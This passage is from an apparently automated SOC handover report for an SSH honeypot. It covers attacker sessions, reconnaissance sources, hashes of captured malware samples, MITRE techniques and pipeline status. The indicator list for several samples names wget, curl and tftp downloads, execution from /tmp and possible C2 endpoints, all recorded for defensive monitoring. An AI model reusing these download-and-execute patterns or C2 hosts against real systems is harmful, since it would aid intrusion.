| `2026-07-04 08:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.6.178[.]98` to AbuseIPDB if not already reported
- [ ] Block `124.6.178[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8a5c6346603

| Field | Detail |
|---|---|
| **Source IP** | `124.6.178[.]98` |
| **First Seen** | 2026-07-04 08:40 |
| **Last Seen** | 2026-07-04 08:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:40:32` | `cowrie.session.connect` |
| `2026-07-04 08:40:32` | `cowrie.client.version` |
| `2026-07-04 08:40:32` | `cowrie.client.kex` |
| `2026-07-04 08:40:33` | `cowrie.login.success` |
| `2026-07-04 08:40:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.6.178[.]98` to AbuseIPDB if not already reported
- [ ] Block `124.6.178[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd2f17099fdd

| Field | Detail |
|---|---|
| **Source IP** | `124.6.178[.]98` |
| **First Seen** | 2026-07-04 08:40 |
| **Last Seen** | 2026-07-04 08:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:40:34` | `cowrie.session.connect` |
| `2026-07-04 08:40:34` | `cowrie.client.version` |
| `2026-07-04 08:40:34` | `cowrie.client.kex` |
| `2026-07-04 08:40:35` | `cowrie.login.success` |
| `2026-07-04 08:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.6.178[.]98` to AbuseIPDB if not already reported
- [ ] Block `124.6.178[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9b40b1e0c69

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 08:42 |
| **Last Seen** | 2026-07-04 08:42 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:42:14` | `cowrie.session.connect` |
| `2026-07-04 08:42:16` | `cowrie.client.version` |
| `2026-07-04 08:42:16` | `cowrie.client.kex` |
| `2026-07-04 08:42:22` | `cowrie.login.success` |
| `2026-07-04 08:42:25` | `cowrie.session.params` |
| `2026-07-04 08:42:25` | `cowrie.command.input` |
| `2026-07-04 08:42:26` | `cowrie.log.closed` |
| `2026-07-04 08:42:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73802d10002d

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-04 08:47 |
| **Last Seen** | 2026-07-04 08:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:47:19` | `cowrie.session.connect` |
| `2026-07-04 08:47:19` | `cowrie.client.version` |
| `2026-07-04 08:47:19` | `cowrie.client.kex` |
| `2026-07-04 08:47:20` | `cowrie.login.success` |
| `2026-07-04 08:47:21` | `cowrie.session.params` |
| `2026-07-04 08:47:21` | `cowrie.command.input` |
| `2026-07-04 08:47:21` | `cowrie.log.closed` |
| `2026-07-04 08:47:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5754c87d8b46

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 08:53 |
| **Last Seen** | 2026-07-04 08:54 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 08:53:56` | `cowrie.session.connect` |
| `2026-07-04 08:53:58` | `cowrie.client.version` |
| `2026-07-04 08:53:58` | `cowrie.client.kex` |
| `2026-07-04 08:54:04` | `cowrie.login.success` |
| `2026-07-04 08:54:07` | `cowrie.session.params` |
| `2026-07-04 08:54:07` | `cowrie.command.input` |
| `2026-07-04 08:54:08` | `cowrie.log.closed` |
| `2026-07-04 08:54:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `208.109.242[.]255` | **45** | 2026-07-04 05:05 | 2026-07-04 08:39 | 22m | 0 | `T1592` | 🟠 MEDIUM |
| `34.78.25[.]99` | **30** | 2026-07-04 05:07 | 2026-07-04 05:07 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `35.205.43[.]106` | **30** | 2026-07-04 05:47 | 2026-07-04 05:48 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `34.22.194[.]117` | **29** | 2026-07-04 06:37 | 2026-07-04 06:38 | 1m | 0 | `T1592` | 🟠 MEDIUM |
| `206.81.2[.]201` | **14** | 2026-07-04 04:59 | 2026-07-04 08:45 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `210.16.100[.]120` | **14** | 2026-07-04 05:07 | 2026-07-04 07:42 | 10m | 0 | `T1592` | 🟠 MEDIUM |
| `34.79.59[.]142` | **10** | 2026-07-04 06:04 | 2026-07-04 06:05 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `18.116.101[.]220` | **4** | 2026-07-04 07:44 | 2026-07-04 08:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | **3** | 2026-07-04 05:51 | 2026-07-04 06:48 | 1m | 0 | `T1592` | 🟢 LOW |
| `154.90.70[.]254` | **2** | 2026-07-04 05:32 | 2026-07-04 05:32 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.148.10[.]121` | **2** | 2026-07-04 07:12 | 2026-07-04 07:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `58.56.200[.]238` | **2** | 2026-07-04 05:37 | 2026-07-04 05:40 | 4m | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]167` | **2** | 2026-07-04 05:35 | 2026-07-04 07:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.13.228[.]234` | 1 | 2026-07-04 05:13 | 2026-07-04 05:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.21.105[.]250` | 1 | 2026-07-04 05:59 | 2026-07-04 06:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.202.189[.]21` | 1 | 2026-07-04 08:24 | 2026-07-04 08:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `124.226.216[.]189` | 1 | 2026-07-04 07:05 | 2026-07-04 07:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `130.211.52[.]176` | 1 | 2026-07-04 06:04 | 2026-07-04 06:04 | 3s | 0 | `T1592` | 🟢 LOW |
| `14.103.113[.]224` | 1 | 2026-07-04 05:14 | 2026-07-04 05:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `172.235.41[.]203` | 1 | 2026-07-04 06:22 | 2026-07-04 06:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.169.100[.]182` | 1 | 2026-07-04 07:42 | 2026-07-04 07:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.245[.]60` | 1 | 2026-07-04 07:49 | 2026-07-04 07:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.223.235[.]10` | 1 | 2026-07-04 05:51 | 2026-07-04 05:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.50.235[.]139` | 1 | 2026-07-04 05:51 | 2026-07-04 05:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `217.148.142[.]94` | 1 | 2026-07-04 05:07 | 2026-07-04 05:07 | 30s | 0 | `T1592` | 🟢 LOW |
| `36.89.252[.]58` | 1 | 2026-07-04 07:26 | 2026-07-04 07:26 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.133.173[.]219` | 1 | 2026-07-04 05:55 | 2026-07-04 05:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]147` | 1 | 2026-07-04 07:07 | 2026-07-04 07:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-07-04 05:35 | 2026-07-04 05:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-07-04 06:40 | 2026-07-04 06:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]71` | 1 | 2026-07-04 07:36 | 2026-07-04 07:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]38` | 1 | 2026-07-04 07:39 | 2026-07-04 07:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]195` | 1 | 2026-07-04 05:59 | 2026-07-04 05:59 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.240.192[.]82` | 1 | 2026-07-04 07:05 | 2026-07-04 07:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | 1 | 2026-07-04 05:59 | 2026-07-04 05:59 | 1s | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | 1 | 2026-07-04 08:40 | 2026-07-04 08:40 | 41s | 0 | `T1592` | 🟢 LOW |
| `8.209.96[.]179` | 1 | 2026-07-04 06:07 | 2026-07-04 06:07 | 10s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]71` | 1 | 2026-07-04 05:55 | 2026-07-04 05:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]85` | 1 | 2026-07-04 05:36 | 2026-07-04 05:36 | 9s | 0 | `T1592` | 🟢 LOW |
| `89.37.172[.]140` | 1 | 2026-07-04 05:36 | 2026-07-04 05:36 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 62/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 80/100 | 🔴 HIGH | **26/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 41/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 64/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 77/100 | 🔴 HIGH | **19/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `146.56.164[.]20` | KR | Oracle Corporation , Global software solutions , California , USA | **100** ⚠️ | 2 |
| `159.65.233[.]253` | US | DigitalOcean, LLC | **100** ⚠️ | 5 |
| `34.79.59[.]142` | BE | Google LLC | **100** ⚠️ | 0 |
| `45.225.135[.]30` | NL | RACK SPHERE HOSTING S.A. | **100** ⚠️ | 37 |
| `185.223.235[.]10` | NL | Infrawatch Limited | **100** ⚠️ | 37 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |
| `120.202.189[.]21` | CN | China Mobile Communications Corporation | **100** ⚠️ | 1 |
| `45.79.207[.]71` | US | Linode | **100** ⚠️ | 50 |
| `39.170.108[.]144` | CN | China Mobile Communications Corporation | **100** ⚠️ | 13 |
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 196 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 163 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 36 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 21 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 20 |

---

## 🔕 False Positive Summary (186 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 182 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 562 cases |
| Tool 34  | Credential Extractor        | ✅ 213 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 23 fingerprints |
| Tool 36  | Command Clustering          | ✅ 11 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 74 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 186 filtered (33.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 48 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 162 priority case(s) shown individually · 40 recon entry/entries in table (13 group(s) consolidating 187 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-04T10:16:01Z_
